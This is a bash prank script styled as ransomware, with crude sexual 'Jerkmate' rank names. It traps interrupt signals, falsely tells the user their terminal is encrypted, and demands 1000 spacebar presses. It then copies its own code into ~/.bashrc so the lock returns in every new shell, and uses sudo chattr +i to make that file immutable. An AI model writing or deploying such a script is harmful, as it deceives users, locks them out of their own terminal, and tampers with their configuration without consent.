#!/bin/bash

trap "" SIGINT SIGTSTP

space_count=0
goal=1000

declare -a ranks=(
    "Unranked 🤡" 
    "Bronze baiter😭" 
    "Silver stroker😬" 
    "Gold gooner😏" 
    "Platinum pounder😎" 
    "Diamond destroyer🤯" 
    "Master baiter🧠" 
    "Grandmaster goon god🔥" 
    "Challenger of willpower🐐"
)

echo "Your terminal has been encrypted due to your lack of security."
echo "To unlock it, you must press the spacebar $goal times."
echo "Every 100 presses, your rank will increase. Good luck."

# Jerkmate ASCII Art
echo -e "\033[1;35m
     ____.             __                   __          
    |    | ___________|  | __ _____ _____ _/  |_  ____  
    |    |/ __ \_  __ \  |/ //     \\__  \\   __\/ __ \ 
/\__|    \  ___/|  | \/    <|  Y Y  \/ __ \|  | \  ___/ 
\________|\___  >__|  |__|_ \__|_|  (____  /__|  \___  >
              \/           \/     \/     \/          \/

\033[0m"

while true; do
    read -sN1 key
    if [[ "$key" == " " ]]; then
        ((space_count++))
        
        rank_index=$((space_count / 100))
        if ((rank_index > ${#ranks[@]} - 1)); then
            rank_index=${#ranks[@]}-1
        fi

        echo -ne "\rSpaces pressed: $space_count / $goal | Rank: ${ranks[$rank_index]}"
    fi

    if [[ "$space_count" -ge "$goal" ]]; then
        echo -e "\nCongratulations! You have reached CHALLENGER rank on Jerkmate and earned back your terminal privileges."
        break
    fi
done

trap - SIGINT SIGTSTP

echo -e "\n# Fun script to restrict terminal access\n$(cat $0)" >> ~/.bashrc
sudo chattr +i ~/.bashrc
